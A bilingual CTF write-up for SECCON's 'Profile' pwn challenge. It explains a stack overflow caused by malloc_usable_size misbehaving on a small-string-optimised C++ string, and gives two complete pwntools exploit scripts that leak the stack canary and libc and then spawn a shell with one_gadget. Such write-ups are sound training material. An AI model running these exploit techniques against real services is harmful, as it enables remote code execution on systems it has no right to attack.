# Profile
---
**Points:** 255 | **Solves:** 64/653 | **Category:** Pwn

Host: profile.pwn.seccon.jp
Port: 28553

[Download](profile_e814c1a78e80ed250c17e94585224b3f3be9d383)
[Download](libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253)

---

[Bahasa Indonesia](#bahasa-indonesia)

## English
```
gdb-peda$ file profile_e814c1a78e80ed250c17e94585224b3f3be9d383
Reading symbols from profile_e814c1a78e80ed250c17e94585224b3f3be9d383...(no debugging symbols found)...done.

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

The challenge is a simple binary to print and store message.

```
Please introduce yourself!
Name >> test
Age >> 21
Message >> nothing

1 : update message
2 : show profile
0 : exit
>>  
```

The prompt is looped, so users can update message and show profile as many times as they want.
Note that name and message are strings, therefore even if we input a long string a buffer overflow will not happen (it will be stored in heap).

Due to the strings datatype (and int for age), let's assume that input_name, input_age, and input_message is not vulnerable.
Also, due to we do not control anything for show_profile than it is most likely that a vulnerability exists in update_message.

Below, a snippet of update_message (ida decompiled).

```cpp
__int64 __fastcall Profile::update_msg(Profile *this)
{
  __int64 v1; // rax
  __int64 result; // rax
  void *ptr; // [rsp+10h] [rbp-10h]
  size_t v4; // [rsp+18h] [rbp-8h]

  ptr = (void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(this);
  v4 = malloc_usable_size(ptr);
  if ( v4 == 0 )
  {
    v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Unable to update message.");
    result = std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Input new message >> ");
    result = getn((char *)ptr, v4);
  }
  return result;
}
```

We can write to message up to the return value of malloc_usable_size(message).
So, how are cpp's strings stored then? For a big string, it will allocate heap with the size of string.
However, there is a thing called Small String Optimization (SSO). It optimizes string allocation by storing small string on the stack.

What would malloc_usable_size(message) return if message if small then?

```
    call   0x400e90 <malloc_usable_size@plt>
=> 0x4010be <Profile::update_msg()+40>:	mov    QWORD PTR [rbp-0x8],rax
    ...

gdb-peda$ p $rax
$1 = 0xfffffffffffffff0
```

It returns a very big number (supposedly negative), that means we can write and possibly have an overflow.
Let's analyze how the program stores name, age, and message.

```
__int64 __fastcall Profile::set_name(__int64 a1, __int64 a2)
{
  return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(a1 + 32, a2);
}

Profile *__fastcall Profile::set_age(Profile *this, int a2)
{
  Profile *result; // rax

  result = this;
  *((_DWORD *)this + 16) = a2;
  return result;
}

__int64 __fastcall Profile::set_msg(__int64 a1, __int64 a2)
{
  return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(a1, a2);
}
```

Basically, it stores `set_msg` on `Profile + 0`, `set_name` on `Profile + 32`, and `set_age` on `Profile + 64`.
Below the condition of allocated Profile (small string for message and name).

```
gdb-peda$ x/12gx 0x7fff85a09e90   
0x7fff85a09e90:	0x00007fff85a09e60 <= pointer to msg	0x0000000000000002 <= msg length
0x7fff85a09ea0:	0x0000000000006161                      0x0000000000000000
0x7fff85a09eb0:	0x00007fff85a09e80 <= pointer to name   0x0000000000000007 <= name length
0x7fff85a09ec0:	0x0061616161616161                      0x0000000000000000
0x7fff85a09ed0:	0x0000000000000001 <= age               0xef86cdc445a5ec00 <= canary
0x7fff85a09ee0:	0x00007fff85a09fd0                      0x0000000000000000
0x7fff85a09ef0:	0x00000000004016b0 <= ret address       0x00007ffff74791c1 <= __libc_start_main+240

```

We can write as many as we want from msg (0x7fff85a09ea0), but there is a canary.
We can leak canary but partially overwriting (first byte) of pointer_to_name in order to print the canary.

We can leak through (in the example) 0x00007fff85a09e00 - 0x00007fff85a09eff to enable a consistent read of canary.
However, for this challenge I just put in `d9` for the partial overwrite (canary's first byte is always 0x00). Randomization is on, so canary's address (first-byte) can be 0xf8, 0xe8, 0x38, etc, but it is always aligned, so the chance of having it in 0xd9 is not low.

We can also leak libc by the offset `f8`. We then spawn shell by using one_gadget.
Below is the script used. My script takes awhile (not that long) to spawn shell. It is a little bit faster to write the code that way, sorry :(

```python
from pwn import *

debug = 0
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

while (1):
	if debug:
		r = process(['./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'], env={"LD_PRELOAD":"./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253"})
	else:
		r = remote('profile.pwn.seccon.jp', 28553)

	r.recvuntil('>>')
	r.sendline('a' * 7)
	r.recvuntil('>>')
	r.sendline('31337')
	r.recvuntil('>>')
	r.sendline('aa')

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 2 + '\xd9')

	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('Name : ')
	canary = u64('\x00' + r.recvline().strip())
	if (canary < (1 << 56)):
		r.close()
		continue

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 2 + '\xf8')

	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('Name : ')
	lsm = u64(r.recvline().strip().ljust(8, '\x00'))
	if (lsm < 0x7f0000000000):
		r.close()
		continue

	libc_base = lsm - libc.symbols.__libc_start_main - 240
	print hex(canary)
	print hex(libc_base)

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 7 + p64(canary) + p64(0) * 3 + p64(libc_base + one[0]))

	r.sendline('0')

	r.interactive()
	break
```

A better solution by my teammates allow a more reliable shell spawn.

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

def debug(p):
    if (len(sys.argv) > 1 and sys.argv[1] == "debug"):
        util.proc.wait_for_debugger(util.proc.pidof(p)[0])

### end of template

p = remote('profile.pwn.seccon.jp', 28553)
# p = process('./profile_e814c1a78e80ed250c17e94585224b3f3be9d383')
binelf = ELF('./profile_e814c1a78e80ed250c17e94585224b3f3be9d383')
binlib = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

# initialize
p.sendline('abcdefgh')
p.sendline('16961')
p.sendline('abcdefg')
p.recvuntil('exit')

found = False
for i in range(16):
    idx = 15-i

    p.sendline('1')
    p.sendline('A' * 0x10 + chr(idx * 0x10))
    p.sendline('2')
    p.recvuntil('Name : ')
    log.debug(idx)
    name = p.recvline()
    if name.startswith('AB') and idx-2 >= 0:
        age_on = idx
        name_on = idx-1
        name_ptr = idx-2
        p.sendline('1')
        p.sendline('A' * 0x10 + chr(name_ptr*0x10))
        p.sendline('2')
        p.recvuntil('Name : ')
        name_leak = u64(p.recvline().strip().ljust(8, '\x00'))
        found = True
        break

if not found:
    log.error('Failed, Try again')
    exit(0)

canary_leak = name_leak + 0x28
log.info('Name leak at {}'.format(hex(name_leak)))
log.info('Canary leak at {}'.format(hex(canary_leak)))

p.sendline('1')
p.sendline('A' * 0x10 + p64(canary_leak))
p.sendline('2')
p.recvuntil('Name : ')
canary = u64(p.recvline().strip().ljust(8, '\x00'))

log.info('Canary {}'.format(hex(canary)))

p.sendline('1')
p.sendline('A' * 0x10 + p64(binelf.got['read']))
p.sendline('2')
p.recvuntil('Name : ')
read_loc = u64(p.recvline().strip().ljust(8, '\x00'))
one_gadget = 0x45216
one_gadget_loc = read_loc + one_gadget - binlib.symbols['read']

log.info('One Gadget {}'.format(hex(one_gadget_loc)))

p.sendline('1')
p.sendline('\x00' * 0x38 + p64(canary) + '\x00' * 0x18 + p64(one_gadget_loc))

p.sendline('0')

p.interactive()
```

## Bahasa Indonesia
```
gdb-peda$ file profile_e814c1a78e80ed250c17e94585224b3f3be9d383
Reading symbols from profile_e814c1a78e80ed250c17e94585224b3f3be9d383...(no debugging symbols found)...done.

gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Diberikan sebuah binary untuk menambahkan pesan dan menampilkan pesan.

```
Please introduce yourself!
Name >> test
Age >> 21
Message >> nothing

1 : update message
2 : show profile
0 : exit
>>  
```

Pengguna dapat menambah dan menampilkan pesan berulang, tidak ada maksimum iterasi.
Tipe data untuk name dan message adalah string, jadi tidak akan terjadi buffer overflow meskipun input panjang (akan disimpan pada heap).

Karena menggunakan string (dan int untuk age), asumsi bahwa input_name, input_age, dan input_message tidak vulnerable.
Selain itu, kita tidak memiliki kontrol atas show_profile sehingga kemungkinan vulnerability tidak ada pada fungsi tersebut juga.

Berikut fungsi update_message (dekompilasi ida).

```cpp
__int64 __fastcall Profile::update_msg(Profile *this)
{
  __int64 v1; // rax
  __int64 result; // rax
  void *ptr; // [rsp+10h] [rbp-10h]
  size_t v4; // [rsp+18h] [rbp-8h]

  ptr = (void *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(this);
  v4 = malloc_usable_size(ptr);
  if ( v4 == 0 )
  {
    v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Unable to update message.");
    result = std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&std::cout, "Input new message >> ");
    result = getn((char *)ptr, v4);
  }
  return result;
}
```

Kita dapat mengubah message sejumlah hasil dari malloc_usable_size(message).
Pada cpp, string disimpan pada heap. Namun, ada Small String Optimization (SSO). SSO mengoptimasi penggunaan string dengan menuliskan string kecil pada stack.

Apa output dari malloc_usable_size(message) apabila string kecil (disimpan pada stack)?

```
    call   0x400e90 <malloc_usable_size@plt>
=> 0x4010be <Profile::update_msg()+40>:	mov    QWORD PTR [rbp-0x8],rax
    ...

gdb-peda$ p $rax
$1 = 0xfffffffffffffff0
```

Outputnya ternyata adalah bilangan negatif, karena bilangan tersebut diinterpretasikan sebagai unsigned (nilai menjadi sangat besar), kita mendapatkan overflow pada stack.
Mari analisa penyimpanan message, name, dan age pada program.

```
__int64 __fastcall Profile::set_name(__int64 a1, __int64 a2)
{
  return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(a1 + 32, a2);
}

Profile *__fastcall Profile::set_age(Profile *this, int a2)
{
  Profile *result; // rax

  result = this;
  *((_DWORD *)this + 16) = a2;
  return result;
}

__int64 __fastcall Profile::set_msg(__int64 a1, __int64 a2)
{
  return std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator=(a1, a2);
}
```

Program menyimpan `set_msg` pada `Profile + 0`, `set_name` pada `Profile + 32`, dan `set_age` pada `Profile + 64`.
Berikut kondisi alokasi Profile (string pendek untuk message dan name).

```
gdb-peda$ x/12gx 0x7fff85a09e90   
0x7fff85a09e90:	0x00007fff85a09e60 <= pointer to msg	0x0000000000000002 <= msg length
0x7fff85a09ea0:	0x0000000000006161                      0x0000000000000000
0x7fff85a09eb0:	0x00007fff85a09e80 <= pointer to name   0x0000000000000007 <= name length
0x7fff85a09ec0:	0x0061616161616161                      0x0000000000000000
0x7fff85a09ed0:	0x0000000000000001 <= age               0xef86cdc445a5ec00 <= canary
0x7fff85a09ee0:	0x00007fff85a09fd0                      0x0000000000000000
0x7fff85a09ef0:	0x00000000004016b0 <= ret address       0x00007ffff74791c1 <= __libc_start_main+240

```

Kita dapat menulis sejumlah berapapun pada msg (0x7fff85a09ea0), tetapi ada canary.
Canary dapat di-leak dengan menulis byte pertama (partial overwrite) dari pointer_to_name.

Kita dapat me-leak (seperti pada contoh) 0x00007fff85a09e00 - 0x00007fff85a09eff untuk mendapatkan pembacaan konsisten canary.
Namun, untuk soal ini saya selalu menulis `d9` untuk partial overwrite (byte pertama canary selalu 0x00). Terdapat ASLR, jadi byte pertama alamat canary dapat berupa 0xf8, 0xe8, 0x38, dst. Namun karena selalu aligned (tidak mungkin terdapat pada 0x31, 0x57, 0x99, dst) maka kemungkinan terdapat pada 0xd9 tidak kecil.

Kita juga dapat leak libc pada `f8`. Selanjutnya spawn shell dengan one_gadget.
Berikut kode yang digunakan. Kode tersebut akan memakan waktu (tidak lama) untuk spawn shell. Sedikit lebih cepat menulis kode tersebut, maaf :(

```python
from pwn import *

debug = 0
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
libc = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

while (1):
	if debug:
		r = process(['./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'], env={"LD_PRELOAD":"./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253"})
	else:
		r = remote('profile.pwn.seccon.jp', 28553)

	r.recvuntil('>>')
	r.sendline('a' * 7)
	r.recvuntil('>>')
	r.sendline('31337')
	r.recvuntil('>>')
	r.sendline('aa')

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 2 + '\xd9')

	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('Name : ')
	canary = u64('\x00' + r.recvline().strip())
	if (canary < (1 << 56)):
		r.close()
		continue

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 2 + '\xf8')

	r.recvuntil('>>')
	r.sendline('2')
	r.recvuntil('Name : ')
	lsm = u64(r.recvline().strip().ljust(8, '\x00'))
	if (lsm < 0x7f0000000000):
		r.close()
		continue

	libc_base = lsm - libc.symbols.__libc_start_main - 240
	print hex(canary)
	print hex(libc_base)

	r.recvuntil('>>')
	r.sendline('1')
	r.recvuntil('>>')
	r.sendline(p64(0) * 7 + p64(canary) + p64(0) * 3 + p64(libc_base + one[0]))

	r.sendline('0')

	r.interactive()
	break
```

Berikut solusi lain dari anggota tim yang lebih dapat diandalkan (tidak harus menunggu untuk spawn shell).

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

def debug(p):
    if (len(sys.argv) > 1 and sys.argv[1] == "debug"):
        util.proc.wait_for_debugger(util.proc.pidof(p)[0])

### end of template

p = remote('profile.pwn.seccon.jp', 28553)
# p = process('./profile_e814c1a78e80ed250c17e94585224b3f3be9d383')
binelf = ELF('./profile_e814c1a78e80ed250c17e94585224b3f3be9d383')
binlib = ELF('./libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253')

# initialize
p.sendline('abcdefgh')
p.sendline('16961')
p.sendline('abcdefg')
p.recvuntil('exit')

found = False
for i in range(16):
    idx = 15-i

    p.sendline('1')
    p.sendline('A' * 0x10 + chr(idx * 0x10))
    p.sendline('2')
    p.recvuntil('Name : ')
    log.debug(idx)
    name = p.recvline()
    if name.startswith('AB') and idx-2 >= 0:
        age_on = idx
        name_on = idx-1
        name_ptr = idx-2
        p.sendline('1')
        p.sendline('A' * 0x10 + chr(name_ptr*0x10))
        p.sendline('2')
        p.recvuntil('Name : ')
        name_leak = u64(p.recvline().strip().ljust(8, '\x00'))
        found = True
        break

if not found:
    log.error('Failed, Try again')
    exit(0)

canary_leak = name_leak + 0x28
log.info('Name leak at {}'.format(hex(name_leak)))
log.info('Canary leak at {}'.format(hex(canary_leak)))

p.sendline('1')
p.sendline('A' * 0x10 + p64(canary_leak))
p.sendline('2')
p.recvuntil('Name : ')
canary = u64(p.recvline().strip().ljust(8, '\x00'))

log.info('Canary {}'.format(hex(canary)))

p.sendline('1')
p.sendline('A' * 0x10 + p64(binelf.got['read']))
p.sendline('2')
p.recvuntil('Name : ')
read_loc = u64(p.recvline().strip().ljust(8, '\x00'))
one_gadget = 0x45216
one_gadget_loc = read_loc + one_gadget - binlib.symbols['read']

log.info('One Gadget {}'.format(hex(one_gadget_loc)))

p.sendline('1')
p.sendline('\x00' * 0x38 + p64(canary) + '\x00' * 0x18 + p64(one_gadget_loc))

p.sendline('0')

p.interactive()
```
